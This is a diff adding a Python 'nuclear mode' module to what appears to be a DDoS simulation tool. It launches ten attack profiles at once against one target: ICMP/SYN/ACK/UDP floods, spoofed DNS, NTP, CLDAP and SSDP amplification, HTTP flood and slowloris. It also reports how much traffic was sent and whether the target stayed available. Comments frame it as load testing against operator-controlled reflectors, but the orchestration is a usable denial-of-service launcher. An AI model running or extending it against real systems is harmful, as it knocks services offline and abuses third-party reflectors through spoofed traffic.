@@ -1,0 +1,1162 @@
+"""Nuclear mode: parallel execution of all attack profiles."""
+
+from __future__ import annotations
+
+import asyncio
+import ctypes
+import multiprocessing as mp
+import os
+import queue
+import socket
+import sys
+import time
+from dataclasses import dataclass
+from typing import Any
+
+from .models import ProfileName, RunConfig, Target, TransportKind, AttackProfile
+from .cancellation import CancelReason
+from .engine import EngineHooks, RunEngine
+from .observation import TargetObserver
+from .transports import raw_capability
+@dataclass(frozen=True, slots=True)
+class NuclearProfile:
+    """Configuration for one profile in the nuclear strike."""
+
+    name: str
+    profile: ProfileName
+    transport: TransportKind
+    port: int | None
+    spoof: bool
+    requires_admin: bool
+
+
+# --------------------------------------------------------------------------
+# Child -> parent messaging
+# --------------------------------------------------------------------------
+#
+# Children are separate processes, so their stdout is interleaved with the
+# parent's live progress table and with each other. Two channels are used
+# instead: stdout for human-readable detail, and a queue of tagged events for
+# anything the aggregator has to *act* on. The tags are what let a profile that
+# has died be distinguished from one that has merely not reported yet - the
+# distinction the previous bare prints could not express.
+
+
+def log(message: str, profile: str | None = None) -> None:
+    """Print one line of child-side detail without interleaving mid-line."""
+    prefix = f"[{profile}] " if profile else ""
+    print(f"{prefix}{message}", flush=True)
+
+
+def emit(
+    result_queue: mp.Queue,
+    profile: str,
+    event: str,
+    **payload: Any,
+) -> None:
+    """Put one tagged event on the queue for the parent to act on."""
+    result_queue.put({"profile": profile, "event": event, **payload})
+
+
+TICK_INTERVAL_S = 0.5
+"""Counter sampling cadence inside each child, matched to the parent's repaint
+interval. Any slower and a running profile's numbers visibly lag the clock."""
+
+CHILD_PROBES_ENABLED = False
+"""Probes are off inside nuclear mode on purpose.
+
+Each child would otherwise run its own prober against the *same* target at the
+same time, so a strike with ten profiles would apply ten times the intended
+probe load and each profile's availability figure would partly measure the other
+nine. That is not a resilience score, it is self-inflicted noise.
+
+The parent takes a single availability reading for the whole strike instead -
+see ``PARENT_PROBE`` - so a nuclear run can still answer "did the target stay
+up", which it previously could not at all.
+"""
+
+PARENT_PROBE_ENABLED = True
+"""One prober for the whole strike, run by the parent.
+
+The module docstring for ``CHILD_PROBES_ENABLED`` explains why the children must
+not each probe. The problem with leaving it at that is that nuclear mode then
+reports no availability figure whatsoever, so a strike that left the target
+completely unresponsive was indistinguishable from one it shrugged off. One
+prober costs one extra request per interval against the target and answers the
+only question that matters about impact.
+"""
+
+PARENT_PROBE_INTERVAL_S = 0.5
+PARENT_PROBE_TIMEOUT_S = 2.0
+"""The probe timeout is generous relative to its interval on purpose. Under a
+10,000 pps flood the target is expected to be slow, and a short timeout would
+report timeouts that say more about the probe than about the target."""
+
+
+def probe_udp_port(host: str, port: int, timeout: float = 0.5) -> bool:
+    """True if *port* is reachable as a UDP service.
+
+    A TCP connect is the wrong test here. A reflector answers UDP and almost
+    never listens on TCP, so probing with TCP would report every reflector as
+    closed and skip the very profiles worth running.
+
+    Instead a *connected* UDP socket is used: the kernel resolves the route and,
+    on a closed port, the resulting ICMP port-unreachable is reported back on the
+    socket. A timeout is treated as reachable, because a filtered port and a busy
+    one look identical from here and refusing to run on that evidence would be
+    the wrong call.
+
+    The specific error differs by platform, and getting this wrong makes every
+    closed port look open: Linux reports ``ConnectionRefusedError``, while
+    Windows reports ``ConnectionResetError`` (WSAECONNRESET). Both are
+    ``ConnectionError``, which is what is caught - catching only the refused
+    case silently reports dead ports as live, which is the exact failure this
+    check exists to prevent.
+    """
+    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        probe.settimeout(timeout)
+        probe.connect((host, port))
+        probe.send(b"\x00")
+        try:
+            probe.recv(1)
+        except socket.timeout:
+            return True
+        except ConnectionError:
+            return False
+        except OSError:
+            return True
+        return True
+    except ConnectionError:
+        return False
+    except (socket.gaierror, OSError):
+        return False
+    finally:
+        probe.close()
+
+
+def filter_available_profiles(
+    profiles: list[NuclearProfile],
+    host: str,
+) -> tuple[list[NuclearProfile], list[tuple[str, str]]]:
+    """Drop profiles aimed at a port with nothing listening.
+
+    Sending at a closed port is not a weaker test, it is no test at all: the
+    packets are discarded by the host before any application sees them, and the
+    result is indistinguishable from a successful run at a target that ignored
+    the load. Skipping them is reported rather than done silently.
+    """
+    keep: list[NuclearProfile] = []
+    skipped: list[tuple[str, str]] = []
+
+    for profile in profiles:
+        # ICMP has no port, and a raw-socket profile will fail loudly anyway.
+        if profile.port is None:
+            keep.append(profile)
+            continue
+        if probe_udp_port(host, profile.port):
+            keep.append(profile)
+        else:
+            skipped.append((profile.name, f"{host}:{profile.port} is closed"))
+
+    return keep, skipped
+
+
+def check_privileges() -> tuple[bool, bool]:
+    """Check if running as Admin and if raw sending is available.
+
+    Returns ``(is_admin, raw_capable)`` where ``raw_capable`` reflects
+    :func:`raw_capability().can_send` — i.e. whether *this process* can send
+    raw packets. The old name ``has_npcap`` was misleading because it was
+    ``False`` on a non-elevated terminal even when Npcap was installed.
+    """
+    is_admin = False
+    try:
+        if sys.platform == "win32":
+            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
+        else:
+            # On Linux/Unix, root (uid 0) is equivalent to Administrator
+            is_admin = os.geteuid() == 0
+    except Exception:
+        pass
+
+    cap = raw_capability()
+    raw_capable = cap.can_send
+
+    return is_admin, raw_capable
+
+
+def _child_capability_worker(q: mp.Queue) -> None:
+    """Worker for check_child_raw_capability; must be top-level for pickling."""
+    from ddosim.transports import raw_capability
+    cap = raw_capability()
+    q.put((cap.can_send, cap.reason))
+
+
+def check_child_raw_capability() -> tuple[bool, str]:
+    """Check raw capability from inside a spawned child process.
+
+    On Windows a ``spawn`` child may not inherit the parent's elevation
+    (the PyInstaller re-exec path does not always preserve the token).
+    This runs the same capability check the child will run, so the wizard
+    skips profiles that *actually* cannot send instead of relying on the
+    parent's token.
+    """
+    ctx = mp.get_context("spawn")
+    result_queue: mp.Queue = ctx.Queue()
+
+    p = ctx.Process(target=_child_capability_worker, args=(result_queue,))
+    p.start()
+    p.join(timeout=5.0)
+    if p.is_alive():
+        p.terminate()
+        p.join()
+        return False, "child process did not respond in time"
+    try:
+        return result_queue.get_nowait()
+    except Exception:
+        return False, "child capability check failed"
+
+
+def build_profiles(
+    target_ip: str,
+    wizard_port: int,
+    reflector_ports: dict[str, int] | int,
+    enable_spoofing: bool = False,
+) -> list[NuclearProfile]:
+    """Build the nuclear profiles from wizard input.
+
+    *reflector_ports* can be either:
+    - A dict mapping protocol names to reflector ports:
+      - DNS: port 53
+      - NTP: port 123
+      - CLDAP: port 389
+      - SSDP: port 1900
+    - Or a single int (legacy API) used for all amplification profiles.
+
+    These must be reflectors the operator controls. Without a valid reflector
+    on the correct port, amplification profiles will only send requests at
+    low rate with no amplification.
+    """
+    # Normalize reflector_ports to a dict
+    if isinstance(reflector_ports, int):
+        reflector_ports_dict = {
+            "dns": reflector_ports,
+            "ntp": reflector_ports,
+            "cldap": reflector_ports,
+            "ssdp": reflector_ports,
+        }
+    else:
+        reflector_ports_dict = reflector_ports
+    # Choose transport and profile variants based on spoofing preference
+    if enable_spoofing:
+        raw_transport = TransportKind.SCAPY
+        icmp_profile = ProfileName.ICMP_FLOOD
+        syn_profile = ProfileName.SYN_FLOOD
+        ack_profile = ProfileName.ACK_FLOOD
+        udp_profile = ProfileName.UDP_FLOOD
+        raw_spoof = True
+        raw_requires_admin = True
+    else:
+        raw_transport = TransportKind.LINUX_RAW
+        icmp_profile = ProfileName.ICMP_FLOOD_NS
+        syn_profile = ProfileName.SYN_FLOOD_NS
+        ack_profile = ProfileName.ACK_FLOOD_NS
+        udp_profile = ProfileName.UDP_FLOOD_NS
+        raw_spoof = False
+        raw_requires_admin = False
+
+    return [
+        NuclearProfile(
+            name="icmp_flood",
+            profile=icmp_profile,
+            transport=raw_transport,
+            port=None,
+            spoof=raw_spoof,
+            requires_admin=raw_requires_admin,
+        ),
+        NuclearProfile(
+            name="syn_flood",
+            profile=syn_profile,
+            transport=raw_transport,
+            port=wizard_port,
+            spoof=raw_spoof,
+            requires_admin=raw_requires_admin,
+        ),
+        NuclearProfile(
+            name="ack_flood",
+            profile=ack_profile,
+            transport=raw_transport,
+            port=wizard_port,
+            spoof=raw_spoof,
+            requires_admin=raw_requires_admin,
+        ),
+        NuclearProfile(
+            name="dns_amplification",
+            profile=ProfileName.DNS_AMPLIFICATION,
+            transport=TransportKind.SCAPY,
+            port=reflector_ports_dict.get("dns", 53),
+            spoof=True,
+            requires_admin=True,
+        ),
+        NuclearProfile(
+            name="ntp_amplification",
+            profile=ProfileName.NTP_AMPLIFICATION,
+            transport=TransportKind.SCAPY,
+            port=reflector_ports_dict.get("ntp", 123),
+            spoof=True,
+            requires_admin=True,
+        ),
+        NuclearProfile(
+            name="cldap_amplification",
+            profile=ProfileName.CLDAP_AMPLIFICATION,
+            transport=TransportKind.SCAPY,
+            port=reflector_ports_dict.get("cldap", 389),
+            spoof=True,
+            requires_admin=True,
+        ),
+        NuclearProfile(
+            name="ssdp_amplification",
+            profile=ProfileName.SSDP_AMPLIFICATION,
+            transport=TransportKind.SCAPY,
+            port=reflector_ports_dict.get("ssdp", 1900),
+            spoof=True,
+            requires_admin=True,
+        ),
+        NuclearProfile(
+            name="udp_flood",
+            profile=udp_profile,
+            transport=raw_transport,
+            port=wizard_port,
+            spoof=raw_spoof,
+            requires_admin=raw_requires_admin,
+        ),
+        NuclearProfile(
+            name="http_flood",
+            profile=ProfileName.HTTP_FLOOD,
+            transport=TransportKind.SOCKET,
+            port=wizard_port,
+            spoof=False,
+            requires_admin=False,
+        ),
+        NuclearProfile(
+            name="slowloris",
+            profile=ProfileName.SLOWLORIS,
+            transport=TransportKind.SOCKET,
+            port=wizard_port,
+            spoof=False,
+            requires_admin=False,
+        ),
+    ]
+
+
+def run_profile_process(
+    config: RunConfig,
+    result_queue: mp.Queue,
+) -> None:
+    """Run a single profile in a subprocess.
+
+    Every failure path emits an event. A child that dies without one leaves the
+    parent with an indistinguishable "still starting" profile until the clock
+    runs out, which is exactly the failure this function exists to prevent.
+    """
+    label = config.label
+
+    # Crash log file in temp dir - survives process death for debugging
+    import atexit
+    import tempfile
+    crash_log = os.path.join(tempfile.gettempdir(), f"ddosim_crash_{label}.log")
+
+    def _write_crash(msg: str) -> None:
+        try:
+            with open(crash_log, "a", encoding="utf-8") as f:
+                f.write(f"{time.time()} {msg}\n")
+        except Exception:
+            pass
+
+    atexit.register(lambda: _write_crash(f"{label} exited normally"))
+
+    try:
+        log(
+            f"start transport={config.transport.value} target={config.target} "
+            f"pps={config.attack.pps} for {config.attack.duration_seconds}s",
+            label,
+        )
+        emit(result_queue, label, "started")
+
+        # Worker errors used to be collected and dropped, so a profile whose
+        # transport refused to open looked identical to one that was busy. The
+        # hook surfaces the reason the moment it happens.
+        def _report(exc: BaseException) -> None:
+            log(f"ERROR {type(exc).__name__}: {exc}", label)
+            emit(result_queue, label, "failed", error=f"{exc!r}")
+
+        # Live counters. Without these the parent's table shows zero for every
+        # profile until it finishes, because a running child has no result yet -
+        # the table looked broken even while the run was working correctly.
+        last_sent = [-1]
+
+        def _tick(snapshot: Any) -> None:
+            sent = snapshot.counters.sent
+            if sent == last_sent[0]:
+                return
+            last_sent[0] = sent
+            emit(
+                result_queue,
+                label,
+                "progress",
+                sent=sent,
+                pps=snapshot.achieved_pps(),
+                elapsed=snapshot.elapsed,
+            )
+
+        engine = RunEngine(
+            config,
+            hooks=EngineHooks(on_tick=_tick, on_worker_error=_report),
+            # Matched to the parent's repaint interval so a running profile's
+            # counters move on every frame instead of every other one.
+            sample_interval_s=TICK_INTERVAL_S,
+            enable_probes=CHILD_PROBES_ENABLED,
+            # The parent takes one /stats reading for the whole strike. Ten
+            # children each reading it would apply ten times the intended probe
+            # load to a target that is already saturated, and all ten would lose
+            # the race to answer.
+            observe_target=False,
+        )
+        outcome = engine.run()
+
+        attack = outcome.result.attack
+        sent = attack.packets_sent
+        attempted = attack.packets_attempted
+        errors = attack.errors
+        log(
+            f"done sent={sent:,} pps={attack.achieved_pps:,.0f} errors={errors:,}",
+            label,
+        )
+
+        # A run that sent nothing has not succeeded, whatever engine.run()
+        # returned. It either was stopped before it could send, or the transport
+        # was never usable and the notes explain why - and those notes are the
+        # only place that reason exists, so they travel with the result instead
+        # of being dropped on the way back to the parent.
+        reasons = [note for note in outcome.notes if note]
+        if outcome.abandoned:
+            reasons.insert(0, "the run was abandoned before it could finish")
+        elif outcome.reason is CancelReason.ERROR:
+            # The notes already carry the setup failure verbatim. Prefixing this
+            # would bury it, and "cancelled" would misdescribe an error.
+            if not reasons:
+                reasons.insert(0, "the run stopped on an error before it could send")
+        elif outcome.cancelled:
+            reasons.insert(0, f"the run was cancelled: {outcome.reason.value}")
+
+        if sent > 0 and not outcome.cancelled:
+            success = True
+            error = None
+        else:
+            success = False
+            if sent == 0:
+                reasons.insert(0, "no packet was ever sent")
+            error = "; ".join(reasons) or "the run ended without sending a packet"
+
+        emit(
+            result_queue,
+            label,
+            "finished",
+            success=success,
+            result=outcome.result,
+            error=error,
+            attempted=attempted,
+            errors=errors,
+        )
+    except BaseException as exc:  # noqa: BLE001 - a child must always report
+        import traceback
+
+        detail = f"{exc}\n{traceback.format_exc()}"
+        log(f"FAILED {type(exc).__name__}: {exc}", label)
+        _write_crash(f"CRASH: {detail}")
+        emit(result_queue, label, "failed", success=False, result=None, error=detail)
+
+
+class NuclearAggregator:
+    """Manages parallel execution and aggregates results."""
+
+    def __init__(
+        self,
+        profiles: list[NuclearProfile],
+        target_ip: str,
+        pps: int,
+        duration: float,
+        payload_size: int = 512,
+        workers: int = 4,
+    ):
+        self.profiles = profiles
+        self.target_ip = target_ip
+        self.pps = pps
+        self.duration = duration
+        self.payload_size = payload_size
+        self.workers = workers
+
+        # Use spawn context for Windows compatibility
+        self._ctx = mp.get_context('spawn')
+        self.result_queue: mp.Queue = self._ctx.Queue()
+        self.processes: list[mp.Process] = []
+        self.start_time: float = 0
+        self.results: dict[str, dict] = {}
+        # Live counters, keyed by label. Kept apart from results so a running
+        # profile's numbers never masquerade as a finished measurement.
+        self.progress: dict[str, dict] = {}
+        # Labels that have announced themselves. A profile in here but not in
+        # results is genuinely running, which is a different thing from a profile
+        # that has not managed to start at all.
+        self.started: set[str] = set()
+        # Terminal failures, outranking anything the same child reports later.
+        self.failures: dict[str, dict] = {}
+        # Target-side observation, one reading either side of the whole strike.
+        self._observer: TargetObserver | None = None
+        self._stats_before: tuple[int, int] | None = None
+        self._stats_after: tuple[int, int] | None = None
+        self._probe_total = 0
+        self._probe_ok = 0
+        self._last_probe = 0.0
+
+    @staticmethod
+    def _label(profile: NuclearProfile) -> str:
+        """The key a profile's events arrive under.
+
+        Both sides of the queue must agree on this or the aggregator reads
+        nothing back and every profile looks unstarted forever. It is derived
+        here, once, from the same object the profile list is built from.
+        """
+        return f"nuclear-{profile.name}"
+
+    def _drain(self) -> None:
+        """Absorb every event currently queued, without blocking."""
+        while True:
+            try:
+                event = self.result_queue.get_nowait()
+            except queue.Empty:
+                return
+            self._absorb(event)
+
+    def _absorb(self, event: dict) -> None:
+        """Fold one event into the aggregator's state.
+
+        Progress is transient and never a result; start events are kept apart
+        from terminal ones, because a late "started" overwriting a finished
+        result would silently discard real measurements.
+
+        A terminal *failure* outranks a later terminal *success* from the same
+        child. A profile whose transport cannot be opened emits "failed" with
+        the real reason, and then still emits "finished" when ``engine.run()``
+        returns normally - it has no exception to raise. Letting that second
+        event overwrite the first turned a run that sent nothing into a clean
+        success, which is how seven raw profiles came to read as silent no-ops
+        while the actual error was printed and then thrown away.
+        """
+        label = event["profile"]
+        kind = event["event"]
+        if kind == "progress":
+            self.progress[label] = event
+            return
+        if kind == "started":
+            self.started.add(label)
+            return
+        self.started.discard(label)
+        if kind == "failed":
+            self.failures[label] = event
+        elif label in self.failures:
+            return
+        self.results[label] = event
+
+    def _progress_loop(self) -> None:
+        """Display live progress until duration expires or all processes finish."""
+        last_update = 0
+        total_profiles = len(self.profiles)
+
+        while time.time() - self.start_time < self.duration:
+            now = time.time()
+            if now - last_update >= 0.5:
+                elapsed = now - self.start_time
+                remaining = max(0, self.duration - elapsed)
+
+                self._drain()
+
+                # Check for completed processes
+                alive_count = sum(1 for p in self.processes if p.is_alive())
+                if alive_count == 0 and len(self.results) >= total_profiles:
+                    break
+
+                self._probe_target()
+                self._print_progress(elapsed, remaining)
+                last_update = now
+
+        # Deliberately no final collection and no final table here. Children may
+        # still be running at the deadline; reaping them is what decides which
+        # results exist, so the caller drains first and prints afterwards.
+
+    def _probe_target(self) -> None:
+        """One availability sample from the parent, against the target itself.
+
+        A failed probe is recorded as a failed sample rather than raised: whether
+        the target is still answering is the measurement, so an unreachable target
+        is data here, not a fault. Bounded by the probe timeout, and skipped
+        entirely if the previous sample is still within the interval.
+        """
+        if not PARENT_PROBE_ENABLED or self._observer is None:
+            return
+        now = time.monotonic()
+        if now - self._last_probe < PARENT_PROBE_INTERVAL_S:
+            return
+        self._last_probe = now
+        self._probe_total += 1
+        try:
+            if asyncio.run(self._observer.alive(PARENT_PROBE_TIMEOUT_S)):
+                self._probe_ok += 1
+        except Exception:  # noqa: BLE001 - defensive; alive() already swallows
+            pass
+
+    def _print_progress(self, elapsed: float, remaining: float) -> None:
+        """Print live progress table."""
+        # Clear screen and move cursor to top
+        print("\033[2J\033[H", end="")
+
+        print("=== Nuclear Strike Active ===")
+        print(f"Target: {self.target_ip} | PPS/profile: {self.pps} | Duration: {self.duration}s")
+        print(f"Elapsed: {elapsed:.1f}s / {self.duration}s | Remaining: {remaining:.1f}s")
+        print()
+
+        header = f"{'Profile':<25} {'PPS':>6} {'Handed to OS':>13} {'Amp':>9} Status"
+        print(header)
+        print("-" * len(header))
+
+        total_sent = 0
+        contributing = 0
+        for profile in self.profiles:
+            result = self.results.get(self._label(profile))
+            if result and result.get("success"):
+                stats = result["result"].attack
+                sent = stats.packets_sent
+                amp_str = stats.amplification_display()
+                # A profile that opened, ran, and sent nothing is not a success.
+                # Rendering it as [DONE] is what made seven scapy profiles look
+                # like completed work while every one of them sent zero packets.
+                if sent > 0:
+                    status = "[DONE]"
+                    total_sent += sent
+                    contributing += 1
+                else:
+                    status = "[EMPTY] sent nothing"
+            elif result:
+                sent = 0
+                amp_str = "-"
+                status = "[ERROR]"
+            elif self._label(profile) in self.started:
+                # A running child streams counters; without them this row sat at
+                # zero for the whole run and looked like a stalled profile.
+                live = self.progress.get(self._label(profile))
+                sent = live["sent"] if live else 0
+                amp_str = "-"
+                status = "[RUNNING]"
+                # Counted here too, or the total sits at zero beside rows that
+                # are plainly non-zero and the whole table reads as broken.
+                total_sent += sent
+                if sent > 0:
+                    contributing += 1
+            else:
+                sent = 0
+                amp_str = "-"
+                status = "[STARTING]"
+
+            print(f"{profile.name:<25} {self.pps:>6} {sent:>13,} {amp_str:>9} {status}")
+
+        print("-" * 70)
+        # Requested against achieved, never the requested figure alone. The old
+        # total was pps * len(profiles), which claimed 100,000 pps for a run that
+        # actually put ~9,100 on the wire - the number a reader would act on was
+        # the fictional one.
+        print(
+            f"{'TOTAL':<25} {self.pps * len(self.profiles):>6} {total_sent:>13,} "
+            f"{'-':>9} {elapsed:.1f}s / {self.duration}s"
+        )
+        print(
+            f"  {contributing}/{len(self.profiles)} profiles contributing; "
+            f"achieved {total_sent / max(elapsed, 1e-9):,.0f} pps of "
+            f"{self.pps * len(self.profiles):,} requested"
+        )
+        if self._probe_total:
+            pct = 100.0 * self._probe_ok / self._probe_total
+            print(
+                f"  target availability: {pct:.0f}% "
+                f"({self._probe_ok}/{self._probe_total} probes answered)"
+            )
+
+    def _print_final_results(self) -> None:
+        """Print final aggregated results."""
+        print("\n" + "=" * 70)
+        print("=== Nuclear Strike Complete ===")
+        print(f"Target: {self.target_ip} | Duration: {self.duration}s | PPS/profile: {self.pps}")
+        print()
+
+        header = f"{'Profile':<25} {'Transport':<8} {'Handed to OS':>13} {'PPS':>8} {'Amp':>9} Status"
+        print(header)
+        print("-" * len(header))
+
+        total_sent = 0
+        total_pps = 0
+        silent: list[str] = []
+        empty: list[str] = []
+        countable = 0
+        for profile in self.profiles:
+            result = self.results.get(self._label(profile))
+            if result and result.get("success"):
+                r = result["result"]
+                sent = r.attack.packets_sent
+                achieved_pps = r.attack.achieved_pps
+                amp_str = r.attack.amplification_display()
+                if sent > 0:
+                    status = "[DONE]"
+                    total_sent += sent
+                    total_pps += achieved_pps
+                    if self._addresses_observed_endpoint(profile):
+                        countable += sent
+                else:
+                    status = "[EMPTY] sent nothing"
+                    empty.append(profile.name)
+            else:
+                sent = 0
+                achieved_pps = 0
+                amp_str = "-"
+                status = "[ERROR]"
+                if result is None:
+                    silent.append(profile.name)
+
+            print(
+                f"{profile.name:<25} {profile.transport.value:<8} {sent:>13,} "
+                f"{achieved_pps:>8,.0f} {amp_str:>9} {status}"
+            )
+
+        print("-" * 70)
+        print(f"{'TOTAL':<25} {'-':<8} {total_sent:>13,} {total_pps:>8,.0f} {'-':>9}")
+        print(
+            f"\n  'Handed to OS' counts packets given to the operating system. It is "
+            f"not confirmation of delivery:\n  the target may have dropped them, "
+            f"been firewalled, or never received them at all."
+        )
+
+        self._print_target_evidence(total_sent, countable)
+        self._print_profile_warnings(silent, empty)
+        self._print_failure_reasons()
+
+        if self._probe_total:
+            pct = 100.0 * self._probe_ok / self._probe_total
+            print()
+            print("Target availability (probed by the parent during the strike):")
+            print(f"  {pct:.0f}%  ({self._probe_ok} of {self._probe_total} probes answered)")
+            if pct < 100.0:
+                print("  The target stopped answering at least once while under load.")
+
+    def _addresses_observed_endpoint(self, profile: NuclearProfile) -> bool:
+        """True if this profile sends HTTP requests to the port whose /stats was read.
+
+        The target's counter sees one thing: HTTP requests its handler served. A
+        UDP datagram to the same port, or a raw packet to any port, is invisible
+        to it. Including those packets in the denominator of a delivery ratio
+        compares two unrelated quantities, and *excluding* the wrong ones is just
+        as bad: a run that delivered every HTTP request can then read as 180%.
+
+        So this is deliberately narrow rather than "same port" - only the HTTP
+        profile over a real socket produces a request this counter can count.
+        """
+        return (
+            profile.profile is ProfileName.HTTP_FLOOD
+            and profile.transport is TransportKind.SOCKET
+            and profile.port == self._http_port()
+        )
+
+    def _print_target_evidence(self, total_sent: int, countable: int) -> None:
+        """Print what the target itself counted, if it could be read.
+
+        The only figure here that is evidence rather than effort. Without it the
+        table's totals are the sender grading its own homework, which is how a
+        run reporting 91,367 packets sent against a target that served nothing
+        could read as a success.
+        """
+        print()
+        print("Target-side evidence (/stats, read by the target itself):")
+        if self._stats_before is None or self._stats_after is None:
+            reason = getattr(self._observer, "_last_error", None)
+            print("  NOT MEASURED - the target's /stats endpoint could not be read.")
+            if reason:
+                print(f"  reason: {reason}")
+            print("  Without this, the totals above are packets attempted, not")
+            print("  packets delivered. Nothing here confirms anything arrived.")
+            return
+
+        served = max(0, self._stats_after[0] - self._stats_before[0])
+        errors = max(0, self._stats_after[1] - self._stats_before[1])
+        print(f"  requests served by target : {served:,}")
+        print(f"  errors reported by target : {errors:,}")
+
+        if countable:
+            share = served / countable
+            print(
+                f"  delivered / handed to OS  : {share:.1%} "
+                f"({served:,} of {countable:,} addressed to this endpoint)"
+            )
+            if share < 0.5:
+                print("  Most of what was sent to this endpoint did not become a")
+                print("  served request.")
+        elif total_sent:
+            print("  No profile addressed this endpoint, so no delivery ratio can")
+            print("  be formed. The served count above covers traffic from outside")
+            print("  this run.")
+        if total_sent > countable:
+            print(
+                f"  ({total_sent - countable:,} further packets went to ports or"
+                f" protocols this counter does not see.)"
+            )
+
+    def _print_profile_warnings(self, silent: list[str], empty: list[str]) -> None:
+        """Name the profiles that produced nothing, and say why that matters.
+
+        Two distinct failures used to render identically as a row of zeroes: a
+        profile that never reported at all, and one that reported success while
+        sending nothing. The first means nothing was collected; the second means
+        something ran and measured nothing. Both read as "sent nothing", which is
+        how seven scapy profiles once appeared to complete successfully.
+        """
+        if silent:
+            print()
+            print(f"WARNING: {len(silent)} profile(s) never reported a result: "
+                  f"{', '.join(silent)}")
+            print("         Their rows above show zero because nothing was "
+                  "collected, not because zero packets were sent.")
+        if empty:
+            print()
+            print(f"WARNING: {len(empty)} profile(s) completed without sending a "
+                  f"single packet: {', '.join(empty)}")
+            print("         A profile that reports success while sending nothing "
+                  "has measured nothing.")
+            print("         Most often this is a privilege problem: the scapy "
+                  "profiles need an")
+            print("         elevated terminal plus Npcap, and without them they "
+                  "open, run, and")
+            print("         emit zero. Check the run's notes, or run one scapy "
+                  "profile alone to see")
+            print("         the refusal reason.")
+
+    def _print_failure_reasons(self) -> None:
+        """Print, per profile, why nothing reached the target.
+
+        A row of zeroes is a symptom; this is the diagnosis. The reason lives in
+        the child's own event and nowhere else, because the engine records a
+        failed transport open as a note rather than an exception. Dropping it on
+        the way back to the parent is what left a whole run of raw profiles
+        reporting "sent nothing" with nothing to act on.
+        """
+        rows: list[tuple[str, str, int, int]] = []
+        for profile in self.profiles:
+            result = self.results.get(self._label(profile))
+            if result is None or result.get("success"):
+                continue
+            reason = str(result.get("error") or "").strip()
+            if not reason:
+                reason = "the child reported no reason"
+            payload = result.get("result")
+            if payload is None:
+                attempted = errors = 0
+            else:
+                attempted = payload.attack.packets_attempted
+                errors = payload.attack.errors
+            rows.append((profile.name, reason, attempted, errors))
+
+        if not rows:
+            return
+        print()
+        print("Why each profile sent nothing:")
+        for name, reason, attempted, errors in rows:
+            # "Never attempted" and "attempted 7,500, all failed" are different
+            # faults, and the row above shows the same zero for both.
+            if attempted or errors:
+                print(
+                    f"  {name}: {attempted:,} attempts, {errors:,} errors, "
+                    f"0 packets sent"
+                )
+            else:
+                print(f"  {name}: never attempted a packet")
+            for line in reason.split("; "):
+                print(f"    - {line}")
+
+    def run(self) -> int:
+        """Execute the nuclear strike."""
+        self.start_time = time.time()
+
+        # One /stats reading for the whole strike, opened before any child is
+        # spawned. This is the only number in the output that is evidence of
+        # delivery rather than of effort, and it has to be bracketing the entire
+        # run: ten children each reading it would apply ten times the intended
+        # probe load to a target that is already saturated, and all ten would
+        # lose the race to answer.
+        self._observer = TargetObserver(self.target_ip, self._http_port())
+        self._stats_before = _read_stats(self._observer)
+
+        # Pre-create configs for each profile
+        configs = []
+        for profile in self.profiles:
+            target = Target(host=self.target_ip, port=profile.port or 80)
+            config = RunConfig(
+                target=target,
+                attack=AttackProfile(
+                    profile=profile.profile,
+                    pps=self.pps,
+                    duration_seconds=self.duration,
+                    payload_size=self.payload_size,
+                    workers=self.workers,
+                    spoof_sources=profile.spoof,
+                ),
+                transport=profile.transport,
+                defenses=[],
+                label=self._label(profile),
+            )
+            configs.append(config)
+
+        # Spawn processes
+        for config in configs:
+            p = self._ctx.Process(
+                target=run_profile_process,
+                args=(config, self.result_queue),
+                daemon=True,
+            )
+            p.start()
+            self.processes.append(p)
+
+        interrupted = False
+        try:
+            self._progress_loop()
+        except KeyboardInterrupt:
+            interrupted = True
+            print("\nInterrupted, stopping all profiles...")
+
+        self._reap()
+        if interrupted:
+            # The strike was cut short, so the totals are not a measurement of
+            # anything. Say so rather than presenting a partial run as a result.
+            print(
+                "\nInterrupted: totals above are partial and are not a "
+                "measurement of the target."
+            )
+            return 130
+
+        # Closing read, after every child is reaped: the target is no longer
+        # being loaded, so it has drained and this does not compete with the run.
+        self._stats_after = _read_stats(self._observer, timeout=10.0)
+        self._print_final_results()
+        return 0
+
+    def _http_port(self) -> int:
+        """The port the target-side /stats endpoint would be on.
+
+        Taken from a socket-backed profile, since those address a real service.
+        The amplification profiles point at a reflector, which does not serve
+        /stats, so they cannot answer this question.
+        """
+        for profile in self.profiles:
+            if profile.port and profile.transport is not TransportKind.SCAPY:
+                return profile.port
+        return 80
+
+    def _reap(self, grace_s: float = 20.0) -> None:
+        """Let children finish reporting, then stop whatever is left.
+
+        Order matters. The previous version terminated stragglers from a
+        ``finally`` block that ran *after* the final table had already been
+        printed, so any child still working at the deadline was killed before it
+        could put its result on the queue - and the run silently reported zero
+        for a profile that had in fact been sending the whole time. Children are
+        therefore given a chance to report first, and only then terminated.
+
+        Scapy profiles need more time for socket teardown; default grace is
+        increased to 20s to accommodate them.
+        """
+        deadline = time.time() + grace_s
+        for p in self.processes:
+            p.join(timeout=max(0.0, deadline - time.time()))
+        for p in self.processes:
+            if p.is_alive():
+                p.terminate()
+                p.join(timeout=1.0)
+        # Anything a child managed to report during the grace period still
+        # counts, so drain once more before the caller prints.
+        self._drain()
+
+
+def _read_stats(
+    observer: TargetObserver, timeout: float | None = None
+) -> tuple[int, int] | None:
+    """One synchronous /stats reading. None when the target cannot answer."""
+    return asyncio.run(observer.read(timeout=timeout))
+
+
+def _ask(prompt: str, default: str | None = None) -> str:
+    suffix = f" [{default}]" if default else ""
+    while True:
+        try:
+            answer = input(f"{prompt}{suffix}: ").strip()
+        except EOFError:
+            return default or ""
+        if answer:
+            return answer
+        if default is not None:
+            return default
+        print("  a value is required")
+
+
+def _ask_int(prompt: str, default: int) -> int:
+    while True:
+        raw = _ask(prompt, str(default))
+        try:
+            return int(raw)
+        except ValueError:
+            print(f"  {raw!r} is not a whole number")
+
+
+def _ask_float(prompt: str, default: float) -> float:
+    while True:
+        raw = _ask(prompt, str(default))
+        try:
+            return float(raw)
+        except ValueError:
+            print(f"  {raw!r} is not a number")
+
+
+def _ask_yes_no(prompt: str, default: bool) -> bool:
+    """Ask a yes/no question with a default."""
+    suffix = " [y/N]" if not default else " [Y/n]"
+    while True:
+        raw = _ask(f"{prompt}{suffix}")
+        if not raw:
+            return default
+        low = raw.lower()
+        if low in ("y", "yes"):
+            return True
+        if low in ("n", "no"):
+            return False
+        print("  Please answer 'y' or 'n'")
+
+
+def nuclear_wizard() -> int:
+    """Interactive wizard for nuclear mode."""
